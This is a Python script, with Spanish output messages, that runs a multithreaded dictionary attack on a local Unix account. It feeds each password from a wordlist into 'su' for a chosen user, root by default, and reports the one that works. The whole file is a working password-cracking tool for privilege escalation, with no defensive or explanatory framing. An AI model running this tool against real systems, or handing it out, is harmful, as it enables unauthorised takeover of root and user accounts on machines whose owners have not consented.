import sys
from subprocess import Popen, PIPE, STDOUT
import threading
import time

devNull = " > /dev/null 2>&1"
global finalPassword
finalPassword=None
global user
nThreads = None
def checkPass(password,lock):
    process = Popen(['su',user], stdout=PIPE, stdin=PIPE, stderr=PIPE)
    stdout_data = process.communicate(input=password.encode())
    stateCode = process.returncode

    if(stateCode == 0):
        global finalPassword
        with lock:
            finalPassword=password

        
    else:
        print("[*]" + password + " -> " + "Incorrect")

lock = threading.RLock()

def readwordlist(path):
    f = open(path,"r")
    words = f.readlines()
    return words

def launchThreads(thread):
    if(threading.active_count() < nThreads):
        thread.start()
    else:
        time.sleep(0.01)
        launchThreads(thread)


def correctPass():
    print("=========================================================================================")
    print("|                                                                                       |")
    print("| [*]" + finalPassword + " -> " + "Correct")
    print("|                                                                                       |")
    print("=========================================================================================")
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        path = sys.argv[1]
        if len(sys.argv)>=3:
            user = sys.argv[2]
        else:
            user = "root"
        
        if len(sys.argv)>=4:
            nThreads = int(sys.argv[3])
        else:
            nThreads = 21
        wordlist = readwordlist(path)
        threads = list()
        print("Cargando passwords...")
        for password in wordlist:
            password = password[:len(password)-1]
            if(finalPassword == None):
                t = threading.Thread(target=checkPass, args=(password,lock))
                threads.append(t)
                launchThreads(t)
            else:
                break

        for i in threads:
            i.join()

        if(finalPassword == None):
            print("No se ha encontrado la password en el diccionario introducido")
        else:
            correctPass()
    else:
        print("Introduzca el wordlist porfavor")